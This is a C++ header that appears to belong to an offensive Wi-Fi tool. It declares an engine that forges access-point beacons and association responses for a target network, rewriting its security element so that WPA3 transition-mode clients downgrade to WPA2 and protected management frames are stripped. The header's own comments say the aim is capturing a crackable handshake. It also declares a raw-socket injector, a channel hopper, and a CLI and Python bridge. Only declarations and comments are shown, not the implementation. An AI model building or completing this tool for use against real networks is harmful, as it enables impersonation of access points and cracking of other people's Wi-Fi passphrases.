#pragma once
// WPA3 -> WPA2 downgrade / PMF-strip engine.
//
// Emits spoofed Beacon, Probe Response and (Re)Association Response frames for
// a target BSSID/SSID with an RSN Information Element rewritten to advertise
// WPA2-PSK/CCMP instead of WPA3-SAE. Clients that implement WPA3 transition
// mode (support both SAE and PSK, PMF optional) will fall back and emit a
// crackable WPA2 4-way handshake. With `strip_pmf` the RSN Capabilities'
// MFP-required bit is cleared and MFP-capable is removed, which also defeats
// PMF-only WPA3 behaviour on transition-mode deployments.
//
// Frame construction is platform independent (pure byte crafting). Injection
// uses a raw AF_PACKET socket on Linux; on other platforms BuildXxx is still
// usable for offline bradbury/burp integration.

#include <cstdint>
#include <string>
#include <vector>

#ifdef _WIN32
#define W3D_API __declspec(dllexport)
#else
#define W3D_API
#endif

namespace w3d {

struct Mac {
    uint8_t b[6];
    static bool Parse(const std::string& s, Mac& out);
    std::string Str() const;
};

// RSN AKM selectors we emit. Default is PSK (02:00:00:00).
enum class Akm : uint8_t {
    Psk   = 0x02,
    FtPsk = 0x04,
    Sae   = 0x08,  // used only when crafting the *original* RSN for diffing
};

struct DowngradeConfig {
    Mac     bssid;
    Mac     source;          // spoofed transmitter; typically == bssid
    std::string ssid;        // up to 32 bytes
    uint8_t channel = 6;
    uint16_t beacon_interval = 100;   // TU
    Akm     akm = Akm::Psk;
    bool    strip_pmf = true;         // clear MFP-required + MFP-capable bits
    bool    include_wmm = true;
    bool    include_ht  = false;      // 2.4GHz HT-capable; adds HT Capabilities
    uint16_t seq = 0;                 // 802.11 sequence counter (12-bit)
};

// ---- frame builders (pure, testable) -----------------------------------
std::vector<uint8_t> BuildBeacon(const DowngradeConfig& cfg);
std::vector<uint8_t> BuildProbeResponse(const DowngradeConfig& cfg, const Mac& dest);
std::vector<uint8_t> BuildReassocResponse(const DowngradeConfig& cfg,
                                          const Mac& dest,
                                          uint16_t status_code = 0);
std::vector<uint8_t> BuildAssocResponse(const DowngradeConfig& cfg,
                                        const Mac& dest,
                                        uint16_t status_code = 0);

// RSN IE derived from cfg. exposed so the caller can log a diff vs. the real
// AP's RSN IE in a report.
std::vector<uint8_t> BuildDowngradedRsnIe(const DowngradeConfig& cfg);

// ---- live injector (Linux AF_PACKET) -----------------------------------
class DowngradeInjector {
public:
    DowngradeInjector();
    ~DowngradeInjector();

    // Opens a raw 802.11 socket bound to iface. `channel` is best-effort via
    // SIOCSIWFREQ; if it fails the socket is still usable if the interface is
    // already on the right channel (e.g. from `iw dev <if> set channel`).
    bool Open(const std::string& iface, uint8_t channel);
    void Close();
    bool IsOpen() const { return fd_ >= 0; }

    // Injects cfg as a beacon. The caller periodically calls this to keep the
    // poisoned BSS visible to clients between scans.
    bool SendBeacon(const DowngradeConfig& cfg);

    // Injects a probe-response to `dest` for the poisoned BSS. Used to reply
    // to clients that actively scan for the SSID.
    bool SendProbeResponse(const DowngradeConfig& cfg, const Mac& dest);

    // Sends a forged (Re)Association Response with the downgraded RSN IE.
    // Used when a client tries to (re)associate — status 0 = success.
    bool SendAssocResponse(const DowngradeConfig& cfg, const Mac& dest,
                           bool reassoc, uint16_t status = 0);

    uint64_t Sent() const { return sent_; }
    uint64_t Errors() const { return errors_; }

private:
    bool Send(const std::vector<uint8_t>& frame);
    int fd_ = -1;
    std::string iface_;
    uint64_t sent_ = 0;
    uint64_t errors_ = 0;
};

// Channel hopping helper — used by the CLI loop. Best effort; returns false
// if the kernel refuses (managed interface, monitor-only driver, etc.).
bool SetChannel(const std::string& iface, uint16_t mhz_or_channel, bool is_mhz = false);

}  // namespace w3d

extern "C" {
// C facade used by the Python ctypes bridge and the CLI.
W3D_API int w3d_run(const char* iface, const char* bssid, const char* ssid,
                    int channel, int duration_sec, int strip_pmf, int beacon_rate_ms);
W3D_API void w3d_stop(void);
W3D_API unsigned long long w3d_sent(void);
W3D_API unsigned long long w3d_errors(void);
}
